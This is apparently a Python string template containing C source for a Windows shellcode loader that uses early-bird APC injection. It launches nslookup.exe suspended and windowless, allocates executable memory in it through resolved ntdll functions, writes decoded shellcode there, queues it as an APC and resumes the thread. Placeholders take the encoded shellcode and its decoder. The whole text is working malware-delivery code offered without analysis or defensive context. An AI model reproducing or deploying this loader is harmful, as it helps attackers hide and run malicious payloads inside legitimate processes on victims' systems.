
ApcInject="""#include<windows.h>
#include<stdio.h>
typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PS_ATTRIBUTE
{
    ULONG  Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
    void* UniqueProcess;
    void* UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _IO_STATUS_BLOCK
{
    union
    {
        NTSTATUS Status;
        VOID* Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef VOID(NTAPI* PIO_APC_ROUTINE) (
    IN PVOID            ApcContext,
    IN PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG            Reserved);

typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
typedef NTSTATUS(NTAPI* pNtOpenThread)(PHANDLE ThreadHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID);
typedef NTSTATUS(NTAPI* pNtSuspendThread)(HANDLE ThreadHandle, PULONG SuspendCount);
typedef NTSTATUS(NTAPI* pNtAlertResumeThread)(HANDLE ThreadHandle, PULONG SuspendCount);
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PULONG RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
typedef NTSTATUS(NTAPI* pNtQueueApcThread)(HANDLE ThreadHandle, PIO_APC_ROUTINE ApcRoutine, PVOID ApcRoutineContext OPTIONAL, PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL, ULONG ApcReserved OPTIONAL);

%s //ShellCode


void run()
{

    %s //Decode ShellCode

    // Create a 64-bit process: 
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPVOID allocation_start;
    SIZE_T allocation_size = sizeof(shellcode);
    
    HANDLE hProcess, hThread;
    NTSTATUS status;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    char cmd[] = \"C:\\\\Windows\\\\System32\\\\nslookup.exe\";

    if (!CreateProcess(
        cmd,                            // Executable
        NULL,                           // Command line
        NULL,                           // Process handle not inheritable
        NULL,                           // Thread handle not inheritable
        FALSE,                          // Set handle inheritance to FALSE 
        CREATE_SUSPENDED |              // Create Suspended for APC Injection
        CREATE_NO_WINDOW,               // Do Not Open a Window
        NULL,                           // Use parent's environment block
        NULL,                           // Use parent's starting directory 
        &si,                            // Pointer to STARTUPINFO structure
        &pi                             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
    }
    WaitForSingleObject(pi.hProcess, 1000); // Allow nslookup 1 second to start/initialize. 
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    // MEDIUM LEVEL API:

    FARPROC fpAddresses[6] = {
        GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\"),
        GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtAllocateVirtualMemory\"),
        GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtWriteVirtualMemory\"),
        GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtSuspendThread\"),
        GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtAlertResumeThread\"),
        GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtQueueApcThread\")
    };

    pNtAllocateVirtualMemory fNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)fpAddresses[1];
    pNtWriteVirtualMemory fNtWriteVirtualMemory = (pNtWriteVirtualMemory)fpAddresses[2];
    pNtSuspendThread fNtSuspendThread = (pNtSuspendThread)fpAddresses[3];
    pNtAlertResumeThread fNtAlertResumeThread = (pNtAlertResumeThread)fpAddresses[4];
    pNtQueueApcThread fNtQueueApcThread = (pNtQueueApcThread)fpAddresses[5];

    allocation_start = NULL;
    fNtAllocateVirtualMemory(pi.hProcess, &allocation_start, 0, (PULONG)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    fNtWriteVirtualMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), 0);
    fNtQueueApcThread(hThread, (PIO_APC_ROUTINE)allocation_start, allocation_start, NULL, NULL);
    fNtAlertResumeThread(hThread, NULL);


}

%s //Execute Main


"""